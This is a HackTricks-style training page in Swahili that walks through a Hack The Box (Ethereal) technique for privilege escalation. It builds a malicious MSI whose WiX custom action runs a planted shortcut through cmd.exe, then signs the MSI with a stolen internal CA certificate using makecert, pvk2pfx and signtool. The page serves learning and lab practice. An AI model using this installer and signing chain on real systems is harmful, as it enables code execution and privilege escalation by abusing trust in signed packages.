# Kuunda MSI ya Custom-Action kwa WiX

{{#include ../../banners/hacktricks-training.md}}

Mlolongo huu wa kihistoria wa Hack The Box ulitumia WiX Toolset v3 kuunda MSI iliyozindua faili ya `.lnk` iliyokuwa imepandikizwa awali. **MSI haipewi privileged moja kwa moja**: utekelezaji hufanyika katika context iliyochaguliwa na sera ya Windows Installer, attributes za custom-action, na mtumiaji anayeisakinisha. Katika scenario ya d, mshambuliaji pia aliiba CA ya trusted signing na kuweka MSI iliyosainiwa kwenye folder iliyokuwa ikifuatiliwa na mtumiaji mwingine.<sup>[[1]](#references)[[3]](#references)</sup>

Kwa uelewa mpana wa mifano ya matumizi ya wix MSI, inashauriwa kushauriana na [ukurasa huu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Hapa, unaweza kupata mifano mbalimbali inayoonyesha matumizi ya wix MSI.<sup>[[2]](#references)</sup>

MSI inaendesha `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. XML ya awali ya WiX v3 imehifadhiwa hapa chini:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` hutangaza toleo la chini la Windows Installer, na `Compressed="yes"` huashiria kuwa package imebanwa. `Stage1` ni deferred lakini ina `Impersonate="yes"`, hivyo huendeshwa kwa kutumia token ya mtumiaji anayesakinisha iliyoigwa; mabadiliko ya privilege katika hali hii yalitokana na mtumiaji mwenye privilege aliyefungua MSI baadaye, wala si attribute hiyo kuipa mchakato SYSTEM kimiujiza.<sup>[[3]](#references)</sup>

Compile source kuwa WiX object kwa kutumia `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Unganisha object hiyo kwenye MSI kwa kutumia `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Hatua ya kusaini iliyotumika katika chain ya awali

Workflow lengwa ilikubali packages zilizosainiwa na internal CA iliyoathiriwa. Maelezo yalitengeneza signing certificate kutoka kwa `MyCA.cer`/`MyCA.pvk` zilizorejeshwa, ikaunda PFX, na kusaini MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Mshambuliaji kisha aliweka package iliyotiwa saini katika `D:\DEV\MSIs` na kusubiri workflow/user mwenye privileged rights aitekeleze. Dumisha sharti hilo unapobadilisha technique: bila njia ya installation yenye elevated privileges, policy isiyo salama kama `AlwaysInstallElevated`, au victim mwenye privileged rights, package hii hutekelezwa kwa rights za current user pekee.

## References

- [1] [Hack The Box - Ethereal: Kutengeneza msi hasidi na kupata root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Utangulizi mfupi: Kutengeneza MSI installer kwa WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — custom actions za deferred execution (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
